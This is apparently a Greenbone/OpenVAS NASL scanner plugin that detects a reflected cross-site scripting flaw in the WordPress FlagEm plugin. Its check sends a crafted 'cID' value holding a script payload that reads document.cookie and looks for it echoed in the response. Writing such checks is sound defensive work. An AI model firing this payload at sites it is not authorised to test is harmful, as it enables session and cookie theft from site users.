CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803842" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-07-26 13:11:00 +0530 (Fri, 26 Jul 2013)" );
	script_name( "WordPress FlagEm Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is running WordPress FlagEm Plugin and is prone to cross-site
scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check weather it is able to
read the cookie or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "Input passed via 'cID' GET parameter to '/FlagEm/flagit.php' script is not
properly sanitised before being returned to the user." );
	script_tag( name: "affected", value: "WordPress FlagEm plugin" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013070173" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-flagem-cross-site-scripting" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122505/WordPress-FlagEm-Cross-Site-Scripting.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/FlagEm/flagit.php?cID=" + "\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: ">Please Note:<" )){
	security_message( port );
	exit( 0 );
}

